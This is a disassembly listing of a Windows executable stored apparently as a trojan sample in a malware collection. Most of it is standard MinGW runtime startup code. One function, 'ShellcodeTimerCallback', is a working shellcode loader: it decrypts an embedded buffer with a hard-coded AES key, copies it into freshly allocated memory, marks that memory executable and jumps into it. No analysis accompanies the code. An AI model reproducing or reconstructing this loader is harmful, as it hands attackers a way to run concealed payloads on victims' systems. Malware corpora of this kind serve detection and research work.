
malware_samples/trojan/882a18b6e6fd19934d859275b19e447aa4e44f3d7659d61aef9ca3353c545237.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <__mingw_invalidParameterHandler>:
   140001000:	c3                   	ret
   140001001:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001008:	00 00 00 00 
   14000100c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000140001010 <pre_c_init>:
   140001010:	48 83 ec 28          	sub    $0x28,%rsp
   140001014:	48 8b 05 f5 2b 35 00 	mov    0x352bf5(%rip),%rax        # 140353c10 <.refptr.__mingw_initltsdrot_force>
   14000101b:	31 c9                	xor    %ecx,%ecx
   14000101d:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001023:	48 8b 05 f6 2b 35 00 	mov    0x352bf6(%rip),%rax        # 140353c20 <.refptr.__mingw_initltsdyn_force>
   14000102a:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001030:	48 8b 05 f9 2b 35 00 	mov    0x352bf9(%rip),%rax        # 140353c30 <.refptr.__mingw_initltssuo_force>
   140001037:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000103d:	48 8b 05 4c 2b 35 00 	mov    0x352b4c(%rip),%rax        # 140353b90 <.refptr.__ImageBase>
   140001044:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   140001049:	75 0f                	jne    14000105a <pre_c_init+0x4a>
   14000104b:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   14000104f:	48 01 d0             	add    %rdx,%rax
   140001052:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140001058:	74 76                	je     1400010d0 <pre_c_init+0xc0>
   14000105a:	48 8b 05 9f 2b 35 00 	mov    0x352b9f(%rip),%rax        # 140353c00 <.refptr.__mingw_app_type>
   140001061:	89 0d a1 af 35 00    	mov    %ecx,0x35afa1(%rip)        # 14035c008 <managedapp>
   140001067:	8b 00                	mov    (%rax),%eax
   140001069:	85 c0                	test   %eax,%eax
   14000106b:	74 53                	je     1400010c0 <pre_c_init+0xb0>
   14000106d:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001072:	e8 b9 49 01 00       	call   140015a30 <__set_app_type>
   140001077:	e8 54 48 01 00       	call   1400158d0 <__p__fmode>
   14000107c:	48 8b 15 6d 2c 35 00 	mov    0x352c6d(%rip),%rdx        # 140353cf0 <.refptr._fmode>
   140001083:	8b 12                	mov    (%rdx),%edx
   140001085:	89 10                	mov    %edx,(%rax)
   140001087:	e8 54 48 01 00       	call   1400158e0 <__p__commode>
   14000108c:	48 8b 15 3d 2c 35 00 	mov    0x352c3d(%rip),%rdx        # 140353cd0 <.refptr._commode>
   140001093:	8b 12                	mov    (%rdx),%edx
   140001095:	89 10                	mov    %edx,(%rax)
   140001097:	e8 94 d2 00 00       	call   14000e330 <_setargv>
   14000109c:	85 c0                	test   %eax,%eax
   14000109e:	0f 88 9a 00 00 00    	js     14000113e <pre_c_init+0x12e>
   1400010a4:	48 8b 05 b5 28 35 00 	mov    0x3528b5(%rip),%rax        # 140353960 <.refptr._MINGW_INSTALL_DEBUG_MATHERR>
   1400010ab:	83 38 01             	cmpl   $0x1,(%rax)
   1400010ae:	74 58                	je     140001108 <pre_c_init+0xf8>
   1400010b0:	31 c0                	xor    %eax,%eax
   1400010b2:	48 83 c4 28          	add    $0x28,%rsp
   1400010b6:	c3                   	ret
   1400010b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400010be:	00 00 
   1400010c0:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400010c5:	e8 66 49 01 00       	call   140015a30 <__set_app_type>
   1400010ca:	eb ab                	jmp    140001077 <pre_c_init+0x67>
   1400010cc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400010d0:	0f b7 50 18          	movzwl 0x18(%rax),%edx
   1400010d4:	66 81 fa 0b 01       	cmp    $0x10b,%dx
   1400010d9:	74 45                	je     140001120 <pre_c_init+0x110>
   1400010db:	66 81 fa 0b 02       	cmp    $0x20b,%dx
   1400010e0:	0f 85 74 ff ff ff    	jne    14000105a <pre_c_init+0x4a>
   1400010e6:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%rax)
   1400010ed:	0f 86 67 ff ff ff    	jbe    14000105a <pre_c_init+0x4a>
   1400010f3:	8b 90 f8 00 00 00    	mov    0xf8(%rax),%edx
   1400010f9:	31 c9                	xor    %ecx,%ecx
   1400010fb:	85 d2                	test   %edx,%edx
   1400010fd:	0f 95 c1             	setne  %cl
   140001100:	e9 55 ff ff ff       	jmp    14000105a <pre_c_init+0x4a>
   140001105:	0f 1f 00             	nopl   (%rax)
   140001108:	48 8b 0d 01 2c 35 00 	mov    0x352c01(%rip),%rcx        # 140353d10 <.refptr._matherr>
   14000110f:	e8 7c d9 00 00       	call   14000ea90 <__mingw_setusermatherr>
   140001114:	31 c0                	xor    %eax,%eax
   140001116:	48 83 c4 28          	add    $0x28,%rsp
   14000111a:	c3                   	ret
   14000111b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001120:	83 78 74 0e          	cmpl   $0xe,0x74(%rax)
   140001124:	0f 86 30 ff ff ff    	jbe    14000105a <pre_c_init+0x4a>
   14000112a:	44 8b 80 e8 00 00 00 	mov    0xe8(%rax),%r8d
   140001131:	31 c9                	xor    %ecx,%ecx
   140001133:	45 85 c0             	test   %r8d,%r8d
   140001136:	0f 95 c1             	setne  %cl
   140001139:	e9 1c ff ff ff       	jmp    14000105a <pre_c_init+0x4a>
   14000113e:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001143:	e8 f8 48 01 00       	call   140015a40 <_amsg_exit>
   140001148:	90                   	nop
   140001149:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000140001150 <pre_cpp_init>:
   140001150:	48 83 ec 48          	sub    $0x48,%rsp
   140001154:	48 8b 05 c5 2b 35 00 	mov    0x352bc5(%rip),%rax        # 140353d20 <.refptr._newmode>
   14000115b:	4c 8d 05 ae ae 35 00 	lea    0x35aeae(%rip),%r8        # 14035c010 <envp>
   140001162:	48 8d 15 af ae 35 00 	lea    0x35aeaf(%rip),%rdx        # 14035c018 <argv>
   140001169:	48 8d 0d b0 ae 35 00 	lea    0x35aeb0(%rip),%rcx        # 14035c020 <argc>
   140001170:	8b 00                	mov    (%rax),%eax
   140001172:	89 44 24 3c          	mov    %eax,0x3c(%rsp)
   140001176:	48 8b 05 63 2b 35 00 	mov    0x352b63(%rip),%rax        # 140353ce0 <.refptr._dowildcard>
   14000117d:	44 8b 08             	mov    (%rax),%r9d
   140001180:	48 8d 44 24 3c       	lea    0x3c(%rsp),%rax
   140001185:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000118a:	e8 91 48 01 00       	call   140015a20 <__getmainargs>
   14000118f:	85 c0                	test   %eax,%eax
   140001191:	78 05                	js     140001198 <pre_cpp_init+0x48>
   140001193:	48 83 c4 48          	add    $0x48,%rsp
   140001197:	c3                   	ret
   140001198:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000119d:	e8 9e 48 01 00       	call   140015a40 <_amsg_exit>
   1400011a2:	90                   	nop
   1400011a3:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400011aa:	00 00 00 00 
   1400011ae:	66 90                	xchg   %ax,%ax

00000001400011b0 <__tmainCRTStartup>:
   1400011b0:	41 54                	push   %r12
   1400011b2:	55                   	push   %rbp
   1400011b3:	57                   	push   %rdi
   1400011b4:	56                   	push   %rsi
   1400011b5:	53                   	push   %rbx
   1400011b6:	48 83 ec 20          	sub    $0x20,%rsp
   1400011ba:	b8 30 00 00 00       	mov    $0x30,%eax
   1400011bf:	65 67 48 8b 00       	mov    %gs:(%eax),%rax
   1400011c4:	48 8b 70 08          	mov    0x8(%rax),%rsi
   1400011c8:	48 8b 1d 81 2a 35 00 	mov    0x352a81(%rip),%rbx        # 140353c50 <.refptr.__native_startup_lock>
   1400011cf:	48 8b 3d 0a c4 35 00 	mov    0x35c40a(%rip),%rdi        # 14035d5e0 <__imp_Sleep>
   1400011d6:	eb 18                	jmp    1400011f0 <__tmainCRTStartup+0x40>
   1400011d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400011df:	00 
   1400011e0:	48 39 c6             	cmp    %rax,%rsi
   1400011e3:	0f 84 5f 01 00 00    	je     140001348 <__tmainCRTStartup+0x198>
   1400011e9:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   1400011ee:	ff d7                	call   *%rdi
   1400011f0:	31 c0                	xor    %eax,%eax
   1400011f2:	f0 48 0f b1 33       	lock cmpxchg %rsi,(%rbx)
   1400011f7:	75 e7                	jne    1400011e0 <__tmainCRTStartup+0x30>
   1400011f9:	31 ff                	xor    %edi,%edi
   1400011fb:	48 8b 35 5e 2a 35 00 	mov    0x352a5e(%rip),%rsi        # 140353c60 <.refptr.__native_startup_state>
   140001202:	8b 06                	mov    (%rsi),%eax
   140001204:	83 f8 01             	cmp    $0x1,%eax
   140001207:	0f 84 d2 01 00 00    	je     1400013df <__tmainCRTStartup+0x22f>
   14000120d:	8b 06                	mov    (%rsi),%eax
   14000120f:	85 c0                	test   %eax,%eax
   140001211:	0f 84 41 01 00 00    	je     140001358 <__tmainCRTStartup+0x1a8>
   140001217:	c7 05 e3 ad 35 00 01 	movl   $0x1,0x35ade3(%rip)        # 14035c004 <has_cctor>
   14000121e:	00 00 00 
   140001221:	8b 06                	mov    (%rsi),%eax
   140001223:	83 f8 01             	cmp    $0x1,%eax
   140001226:	0f 84 84 01 00 00    	je     1400013b0 <__tmainCRTStartup+0x200>
   14000122c:	85 ff                	test   %edi,%edi
   14000122e:	0f 84 4c 01 00 00    	je     140001380 <__tmainCRTStartup+0x1d0>
   140001234:	48 8b 05 85 29 35 00 	mov    0x352985(%rip),%rax        # 140353bc0 <.refptr.__dyn_tls_init_callback>
   14000123b:	48 8b 00             	mov    (%rax),%rax
   14000123e:	48 85 c0             	test   %rax,%rax
   140001241:	74 0c                	je     14000124f <__tmainCRTStartup+0x9f>
   140001243:	45 31 c0             	xor    %r8d,%r8d
   140001246:	ba 02 00 00 00       	mov    $0x2,%edx
   14000124b:	31 c9                	xor    %ecx,%ecx
   14000124d:	ff d0                	call   *%rax
   14000124f:	e8 8c d4 00 00       	call   14000e6e0 <_pei386_runtime_relocator>
   140001254:	48 8b 0d a5 2a 35 00 	mov    0x352aa5(%rip),%rcx        # 140353d00 <.refptr._gnu_exception_handler>
   14000125b:	ff 15 77 c3 35 00    	call   *0x35c377(%rip)        # 14035d5d8 <__imp_SetUnhandledExceptionFilter>
   140001261:	48 8b 15 d8 29 35 00 	mov    0x3529d8(%rip),%rdx        # 140353c40 <.refptr.__mingw_oldexcpt_handler>
   140001268:	48 8d 0d 91 fd ff ff 	lea    -0x26f(%rip),%rcx        # 140001000 <__mingw_invalidParameterHandler>
   14000126f:	48 89 02             	mov    %rax,(%rdx)
   140001272:	e8 69 47 01 00       	call   1400159e0 <_set_invalid_parameter_handler>
   140001277:	e8 74 d2 00 00       	call   14000e4f0 <_fpreset>
   14000127c:	8b 1d 9e ad 35 00    	mov    0x35ad9e(%rip),%ebx        # 14035c020 <argc>
   140001282:	8d 7b 01             	lea    0x1(%rbx),%edi
   140001285:	48 63 ff             	movslq %edi,%rdi
   140001288:	48 c1 e7 03          	shl    $0x3,%rdi
   14000128c:	48 89 f9             	mov    %rdi,%rcx
   14000128f:	e8 34 48 01 00       	call   140015ac8 <malloc>
   140001294:	4c 8b 25 7d ad 35 00 	mov    0x35ad7d(%rip),%r12        # 14035c018 <argv>
   14000129b:	48 89 c5             	mov    %rax,%rbp
   14000129e:	85 db                	test   %ebx,%ebx
   1400012a0:	0f 8e 2a 01 00 00    	jle    1400013d0 <__tmainCRTStartup+0x220>
   1400012a6:	48 83 ef 08          	sub    $0x8,%rdi
   1400012aa:	31 db                	xor    %ebx,%ebx
   1400012ac:	0f 1f 40 00          	nopl   0x0(%rax)
   1400012b0:	49 8b 0c 1c          	mov    (%r12,%rbx,1),%rcx
   1400012b4:	e8 67 48 01 00       	call   140015b20 <strlen>
   1400012b9:	48 8d 70 01          	lea    0x1(%rax),%rsi
   1400012bd:	48 89 f1             	mov    %rsi,%rcx
   1400012c0:	e8 03 48 01 00       	call   140015ac8 <malloc>
   1400012c5:	49 89 f0             	mov    %rsi,%r8
   1400012c8:	48 89 44 1d 00       	mov    %rax,0x0(%rbp,%rbx,1)
   1400012cd:	49 8b 14 1c          	mov    (%r12,%rbx,1),%rdx
   1400012d1:	48 89 c1             	mov    %rax,%rcx
   1400012d4:	48 83 c3 08          	add    $0x8,%rbx
   1400012d8:	e8 03 48 01 00       	call   140015ae0 <memcpy>
   1400012dd:	48 39 df             	cmp    %rbx,%rdi
   1400012e0:	75 ce                	jne    1400012b0 <__tmainCRTStartup+0x100>
   1400012e2:	48 01 ef             	add    %rbp,%rdi
   1400012e5:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   1400012ec:	48 89 2d 25 ad 35 00 	mov    %rbp,0x35ad25(%rip)        # 14035c018 <argv>
   1400012f3:	e8 18 d0 00 00       	call   14000e310 <__main>
   1400012f8:	e8 f3 45 01 00       	call   1400158f0 <__p___initenv>
   1400012fd:	4c 8b 05 0c ad 35 00 	mov    0x35ad0c(%rip),%r8        # 14035c010 <envp>
   140001304:	8b 0d 16 ad 35 00    	mov    0x35ad16(%rip),%ecx        # 14035c020 <argc>
   14000130a:	4c 89 00             	mov    %r8,(%rax)
   14000130d:	48 8b 15 04 ad 35 00 	mov    0x35ad04(%rip),%rdx        # 14035c018 <argv>
   140001314:	e8 27 71 02 00       	call   140028440 <main>
   140001319:	8b 0d e9 ac 35 00    	mov    0x35ace9(%rip),%ecx        # 14035c008 <managedapp>
   14000131f:	89 05 e7 ac 35 00    	mov    %eax,0x35ace7(%rip)        # 14035c00c <mainret>
   140001325:	85 c9                	test   %ecx,%ecx
   140001327:	0f 84 ab 00 00 00    	je     1400013d8 <__tmainCRTStartup+0x228>
   14000132d:	8b 15 d1 ac 35 00    	mov    0x35acd1(%rip),%edx        # 14035c004 <has_cctor>
   140001333:	85 d2                	test   %edx,%edx
   140001335:	74 59                	je     140001390 <__tmainCRTStartup+0x1e0>
   140001337:	48 83 c4 20          	add    $0x20,%rsp
   14000133b:	5b                   	pop    %rbx
   14000133c:	5e                   	pop    %rsi
   14000133d:	5f                   	pop    %rdi
   14000133e:	5d                   	pop    %rbp
   14000133f:	41 5c                	pop    %r12
   140001341:	c3                   	ret
   140001342:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001348:	bf 01 00 00 00       	mov    $0x1,%edi
   14000134d:	e9 a9 fe ff ff       	jmp    1400011fb <__tmainCRTStartup+0x4b>
   140001352:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001358:	48 8b 15 61 29 35 00 	mov    0x352961(%rip),%rdx        # 140353cc0 <.refptr.__xi_z>
   14000135f:	48 8b 0d 4a 29 35 00 	mov    0x35294a(%rip),%rcx        # 140353cb0 <.refptr.__xi_a>
   140001366:	c7 06 01 00 00 00    	movl   $0x1,(%rsi)
   14000136c:	e8 1f 45 01 00       	call   140015890 <_initterm_e>
   140001371:	85 c0                	test   %eax,%eax
   140001373:	0f 84 a8 fe ff ff    	je     140001221 <__tmainCRTStartup+0x71>
   140001379:	b8 ff 00 00 00       	mov    $0xff,%eax
   14000137e:	eb b7                	jmp    140001337 <__tmainCRTStartup+0x187>
   140001380:	31 c0                	xor    %eax,%eax
   140001382:	48 87 03             	xchg   %rax,(%rbx)
   140001385:	e9 aa fe ff ff       	jmp    140001234 <__tmainCRTStartup+0x84>
   14000138a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001390:	e8 b3 46 01 00       	call   140015a48 <_cexit>
   140001395:	8b 05 71 ac 35 00    	mov    0x35ac71(%rip),%eax        # 14035c00c <mainret>
   14000139b:	48 83 c4 20          	add    $0x20,%rsp
   14000139f:	5b                   	pop    %rbx
   1400013a0:	5e                   	pop    %rsi
   1400013a1:	5f                   	pop    %rdi
   1400013a2:	5d                   	pop    %rbp
   1400013a3:	41 5c                	pop    %r12
   1400013a5:	c3                   	ret
   1400013a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400013ad:	00 00 00 
   1400013b0:	48 8b 15 e9 28 35 00 	mov    0x3528e9(%rip),%rdx        # 140353ca0 <.refptr.__xc_z>
   1400013b7:	48 8b 0d d2 28 35 00 	mov    0x3528d2(%rip),%rcx        # 140353c90 <.refptr.__xc_a>
   1400013be:	e8 95 46 01 00       	call   140015a58 <_initterm>
   1400013c3:	c7 06 02 00 00 00    	movl   $0x2,(%rsi)
   1400013c9:	e9 5e fe ff ff       	jmp    14000122c <__tmainCRTStartup+0x7c>
   1400013ce:	66 90                	xchg   %ax,%ax
   1400013d0:	48 89 c7             	mov    %rax,%rdi
   1400013d3:	e9 0d ff ff ff       	jmp    1400012e5 <__tmainCRTStartup+0x135>
   1400013d8:	89 c1                	mov    %eax,%ecx
   1400013da:	e8 a9 46 01 00       	call   140015a88 <exit>
   1400013df:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   1400013e4:	e8 57 46 01 00       	call   140015a40 <_amsg_exit>
   1400013e9:	90                   	nop
   1400013ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

00000001400013f0 <WinMainCRTStartup>:
   1400013f0:	48 83 ec 28          	sub    $0x28,%rsp

00000001400013f4 <.l_startw>:
   1400013f4:	48 8b 05 05 28 35 00 	mov    0x352805(%rip),%rax        # 140353c00 <.refptr.__mingw_app_type>
   1400013fb:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001401:	e8 aa fd ff ff       	call   1400011b0 <__tmainCRTStartup>
   140001406:	90                   	nop

0000000140001407 <.l_endw>:
   140001407:	90                   	nop
   140001408:	48 83 c4 28          	add    $0x28,%rsp
   14000140c:	c3                   	ret
   14000140d:	0f 1f 00             	nopl   (%rax)

0000000140001410 <mainCRTStartup>:
   140001410:	48 83 ec 28          	sub    $0x28,%rsp

0000000140001414 <.l_start>:
   140001414:	48 8b 05 e5 27 35 00 	mov    0x3527e5(%rip),%rax        # 140353c00 <.refptr.__mingw_app_type>
   14000141b:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140001421:	e8 8a fd ff ff       	call   1400011b0 <__tmainCRTStartup>
   140001426:	90                   	nop

0000000140001427 <.l_end>:
   140001427:	90                   	nop
   140001428:	48 83 c4 28          	add    $0x28,%rsp
   14000142c:	c3                   	ret
   14000142d:	0f 1f 00             	nopl   (%rax)

0000000140001430 <atexit>:
   140001430:	e9 43 46 01 00       	jmp    140015a78 <_crt_atexit>
   140001435:	90                   	nop
   140001436:	90                   	nop
   140001437:	90                   	nop
   140001438:	90                   	nop
   140001439:	90                   	nop
   14000143a:	90                   	nop
   14000143b:	90                   	nop
   14000143c:	90                   	nop
   14000143d:	90                   	nop
   14000143e:	90                   	nop
   14000143f:	90                   	nop

0000000140001440 <__gcc_register_frame>:
   140001440:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 140001450 <__gcc_deregister_frame>
   140001447:	e9 e4 ff ff ff       	jmp    140001430 <atexit>
   14000144c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000140001450 <__gcc_deregister_frame>:
   140001450:	c3                   	ret
   140001451:	90                   	nop
   140001452:	90                   	nop
   140001453:	90                   	nop
   140001454:	90                   	nop
   140001455:	90                   	nop
   140001456:	90                   	nop
   140001457:	90                   	nop
   140001458:	90                   	nop
   140001459:	90                   	nop
   14000145a:	90                   	nop
   14000145b:	90                   	nop
   14000145c:	90                   	nop
   14000145d:	90                   	nop
   14000145e:	90                   	nop
   14000145f:	90                   	nop

0000000140001460 <_Z22ShellcodeTimerCallbackPvh>:
   140001460:	57                   	push   %rdi
   140001461:	56                   	push   %rsi
   140001462:	53                   	push   %rbx
   140001463:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
   140001467:	66 0f ef c0          	pxor   %xmm0,%xmm0
   14000146b:	41 b9 18 00 00 00    	mov    $0x18,%r9d
   140001471:	45 31 c0             	xor    %r8d,%r8d
   140001474:	31 d2                	xor    %edx,%edx
   140001476:	48 89 cb             	mov    %rcx,%rbx
   140001479:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   14000147e:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001483:	c7 44 24 20 00 00 00 	movl   $0xf0000000,0x20(%rsp)
   14000148a:	f0 
   14000148b:	ff 15 a7 bf 35 00    	call   *0x35bfa7(%rip)        # 14035d438 <__IAT_start__>
   140001491:	85 c0                	test   %eax,%eax
   140001493:	0f 84 57 01 00 00    	je     1400015f0 <_Z22ShellcodeTimerCallbackPvh+0x190>
   140001499:	f3 0f 6f 0d 7f db 34 	movdqu 0x34db7f(%rip),%xmm1        # 14034f020 <aes_key>
   1400014a0:	00 
   1400014a1:	f3 0f 6f 15 87 db 34 	movdqu 0x34db87(%rip),%xmm2        # 14034f030 <aes_key+0x10>
   1400014a8:	00 
   1400014a9:	45 31 c9             	xor    %r9d,%r9d
   1400014ac:	48 b8 08 02 00 00 10 	movabs $0x661000000208,%rax
   1400014b3:	66 00 00 
   1400014b6:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400014bb:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi
   1400014c0:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   1400014c5:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400014ca:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400014cf:	41 b8 2c 00 00 00    	mov    $0x2c,%r8d
   1400014d5:	48 89 f2             	mov    %rsi,%rdx
   1400014d8:	c7 44 24 58 20 00 00 	movl   $0x20,0x58(%rsp)
   1400014df:	00 
   1400014e0:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   1400014e7:	00 
   1400014e8:	0f 11 4c 24 5c       	movups %xmm1,0x5c(%rsp)
   1400014ed:	0f 11 54 24 6c       	movups %xmm2,0x6c(%rsp)
   1400014f2:	ff 15 58 bf 35 00    	call   *0x35bf58(%rip)        # 14035d450 <__imp_CryptImportKey>
   1400014f8:	85 c0                	test   %eax,%eax
   1400014fa:	0f 84 f0 00 00 00    	je     1400015f0 <_Z22ShellcodeTimerCallbackPvh+0x190>
   140001500:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140001505:	45 31 c9             	xor    %r9d,%r9d
   140001508:	ba 01 00 00 00       	mov    $0x1,%edx
   14000150d:	4c 8d 05 ec da 34 00 	lea    0x34daec(%rip),%r8        # 14034f000 <aes_iv>
   140001514:	ff 15 46 bf 35 00    	call   *0x35bf46(%rip)        # 14035d460 <__imp_CryptSetKeyParam>
   14000151a:	85 c0                	test   %eax,%eax
   14000151c:	0f 84 ce 00 00 00    	je     1400015f0 <_Z22ShellcodeTimerCallbackPvh+0x190>
   140001522:	8b 15 c8 da 34 00    	mov    0x34dac8(%rip),%edx        # 14034eff0 <encrypted_size>
   140001528:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   14000152e:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   140001534:	31 c9                	xor    %ecx,%ecx
   140001536:	ff 15 dc c0 35 00    	call   *0x35c0dc(%rip)        # 14035d618 <__imp_VirtualAlloc>
   14000153c:	48 89 c7             	mov    %rax,%rdi
   14000153f:	48 85 c0             	test   %rax,%rax
   140001542:	0f 84 a8 00 00 00    	je     1400015f0 <_Z22ShellcodeTimerCallbackPvh+0x190>
   140001548:	44 8b 05 a1 da 34 00 	mov    0x34daa1(%rip),%r8d        # 14034eff0 <encrypted_size>
   14000154f:	48 89 da             	mov    %rbx,%rdx
   140001552:	48 89 c1             	mov    %rax,%rcx
   140001555:	e8 86 45 01 00       	call   140015ae0 <memcpy>
   14000155a:	8b 05 90 da 34 00    	mov    0x34da90(%rip),%eax        # 14034eff0 <encrypted_size>
   140001560:	45 31 c9             	xor    %r9d,%r9d
   140001563:	31 d2                	xor    %edx,%edx
   140001565:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000156a:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   14000156f:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001575:	89 44 24 3c          	mov    %eax,0x3c(%rsp)
   140001579:	48 8d 44 24 3c       	lea    0x3c(%rsp),%rax
   14000157e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001583:	ff 15 b7 be 35 00    	call   *0x35beb7(%rip)        # 14035d440 <__imp_CryptDecrypt>
   140001589:	85 c0                	test   %eax,%eax
   14000158b:	74 43                	je     1400015d0 <_Z22ShellcodeTimerCallbackPvh+0x170>
   14000158d:	8b 54 24 3c          	mov    0x3c(%rsp),%edx
   140001591:	49 89 f1             	mov    %rsi,%r9
   140001594:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   14000159a:	48 89 f9             	mov    %rdi,%rcx
   14000159d:	8d 42 ff             	lea    -0x1(%rdx),%eax
   1400015a0:	0f b6 04 07          	movzbl (%rdi,%rax,1),%eax
   1400015a4:	29 c2                	sub    %eax,%edx
   1400015a6:	ff 15 7c c0 35 00    	call   *0x35c07c(%rip)        # 14035d628 <__imp_VirtualProtect>
   1400015ac:	85 c0                	test   %eax,%eax
   1400015ae:	74 20                	je     1400015d0 <_Z22ShellcodeTimerCallbackPvh+0x170>
   1400015b0:	ff d7                	call   *%rdi
   1400015b2:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   1400015b7:	48 85 c9             	test   %rcx,%rcx
   1400015ba:	75 74                	jne    140001630 <_Z22ShellcodeTimerCallbackPvh+0x1d0>
   1400015bc:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400015c1:	48 85 c9             	test   %rcx,%rcx
   1400015c4:	74 3e                	je     140001604 <_Z22ShellcodeTimerCallbackPvh+0x1a4>
   1400015c6:	31 d2                	xor    %edx,%edx
   1400015c8:	ff 15 8a be 35 00    	call   *0x35be8a(%rip)        # 14035d458 <__imp_CryptReleaseContext>
   1400015ce:	eb 34                	jmp    140001604 <_Z22ShellcodeTimerCallbackPvh+0x1a4>
   1400015d0:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   1400015d6:	31 d2                	xor    %edx,%edx
   1400015d8:	48 89 f9             	mov    %rdi,%rcx
   1400015db:	ff 15 3f c0 35 00    	call   *0x35c03f(%rip)        # 14035d620 <__imp_VirtualFree>
   1400015e1:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400015e8:	00 00 00 00 
   1400015ec:	0f 1f 40 00          	nopl   0x0(%rax)
   1400015f0:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   1400015f5:	48 85 c9             	test   %rcx,%rcx
   1400015f8:	75 2e                	jne    140001628 <_Z22ShellcodeTimerCallbackPvh+0x1c8>
   1400015fa:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400015ff:	48 85 c9             	test   %rcx,%rcx
   140001602:	75 0c                	jne    140001610 <_Z22ShellcodeTimerCallbackPvh+0x1b0>
   140001604:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
   140001608:	5b                   	pop    %rbx
   140001609:	5e                   	pop    %rsi
   14000160a:	5f                   	pop    %rdi
   14000160b:	c3                   	ret
   14000160c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001610:	31 d2                	xor    %edx,%edx
   140001612:	ff 15 40 be 35 00    	call   *0x35be40(%rip)        # 14035d458 <__imp_CryptReleaseContext>
   140001618:	90                   	nop
   140001619:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
   14000161d:	5b                   	pop    %rbx
   14000161e:	5e                   	pop    %rsi
   14000161f:	5f                   	pop    %rdi
   140001620:	c3                   	ret
   140001621:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001628:	ff 15 1a be 35 00    	call   *0x35be1a(%rip)        # 14035d448 <__imp_CryptDestroyKey>
   14000162e:	eb ca                	jmp    1400015fa <_Z22ShellcodeTimerCallbackPvh+0x19a>
   140001630:	ff 15 12 be 35 00    	call   *0x35be12(%rip)        # 14035d448 <__imp_CryptDestroyKey>
   140001636:	eb 84                	jmp    1400015bc <_Z22ShellcodeTimerCallbackPvh+0x15c>
   140001638:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   14000163d:	48 89 c3             	mov    %rax,%rbx
   140001640:	48 85 c9             	test   %rcx,%rcx
   140001643:	74 06                	je     14000164b <_Z22ShellcodeTimerCallbackPvh+0x1eb>
   140001645:	ff 15 fd bd 35 00    	call   *0x35bdfd(%rip)        # 14035d448 <__imp_CryptDestroyKey>
   14000164b:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140001650:	48 85 c9             	test   %rcx,%rcx
   140001653:	74 08                	je     14000165d <_Z22ShellcodeTimerCallbackPvh+0x1fd>
   140001655:	31 d2                	xor    %edx,%edx
   140001657:	ff 15 fb bd 35 00    	call   *0x35bdfb(%rip)        # 14035d458 <__imp_CryptReleaseContext>
   14000165d:	48 89 d9             	mov    %rbx,%rcx
   140001660:	e8 8b e0 00 00       	call   14000f6f0 <_Unwind_Resume>
   140001665:	90                   	nop
   140001666:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000166d:	00 00 00 

0000000140001670 <_Z18AES_Decrypt_ManualPhjPKhS1_S_Pj>:
   140001670:	c3                   	ret
